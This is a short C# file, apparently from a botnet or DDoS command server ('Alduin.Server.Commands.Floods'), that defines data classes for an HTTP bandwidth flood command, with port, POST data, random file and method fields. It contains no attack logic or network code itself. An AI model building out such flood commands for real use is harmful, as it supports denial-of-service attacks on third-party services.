using System;
using System.Collections.Generic;
using System.Text;

namespace Alduin.Server.Commands.Floods
{
    public class HttpBandWidthCommand
    {
        public HttpBandWidthVariables newHttpBandWidthVariables { get; set; }
        public BaseCommands newBaseCommand { get; set; }
        public BaseFloodModel newBaseFloodModel { get; set; }
    }

    public class HttpBandWidthVariables
    {
        public int Port { get; set; }
        public string PostDATA { get; set; }
        public bool RandomFile { get; set; }
        public string Method { get; set; }
    }
}
